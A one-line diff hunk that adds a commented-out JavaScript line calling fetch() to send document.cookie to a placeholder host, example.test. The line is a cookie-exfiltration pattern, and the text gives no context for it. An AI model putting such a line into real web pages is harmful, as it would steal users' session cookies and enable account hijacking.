@@ -1,0 +1,1 @@
+// fetch("https://example.test/collect?c="+document.cookie);
